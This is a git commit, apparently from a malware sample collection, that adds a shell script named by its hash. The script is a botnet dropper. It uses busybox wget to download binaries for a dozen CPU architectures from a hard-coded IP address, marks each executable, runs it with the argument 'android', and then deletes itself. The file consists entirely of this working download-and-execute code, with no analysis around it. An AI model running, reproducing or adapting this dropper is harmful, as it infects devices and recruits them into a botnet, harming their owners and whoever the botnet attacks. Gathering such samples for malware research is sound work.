abc8ffc79a72c66762b41291a51c15a219219c43
Mariam Elsoufy <mariamelsoufyy@gmail.com>
2025-05-04 07:09:20 +0300

    wewaa

---
+++ sampola/35d0f817f0231cc57d25c67f08acc47d45fcd9f64cf5356ee21a2b83626327b4.sh
@@ -0,0 +1,14 @@
+busybox wget http://161.248.238.54/arm; chmod 777 arm; ./arm android
+busybox wget http://161.248.238.54/arm5; chmod 777 arm5; ./arm5 android
+busybox wget http://161.248.238.54/arm6; chmod 777 arm6; ./arm6 android
+busybox wget http://161.248.238.54/arm7; chmod 777 arm7; ./arm7 android
+busybox wget http://161.248.238.54/m68k; chmod 777 m68k; ./m68k android
+busybox wget http://161.248.238.54/mips; chmod 777 mips; ./mips android
+busybox wget http://161.248.238.54/mpsl; chmod 777 mpsl; ./mpsl android
+busybox wget http://161.248.238.54/ppc; chmod 777 ppc; ./ppc android
+busybox wget http://161.248.238.54/sh4; chmod 777 sh4; ./sh4 android
+busybox wget http://161.248.238.54/spc; chmod 777 spc; ./spc android
+busybox wget http://161.248.238.54/x86; chmod 777 x86; ./x86 android
+busybox wget http://161.248.238.54/x86_64; chmod 777 x86_64; ./x86_64 android
+
+rm $0
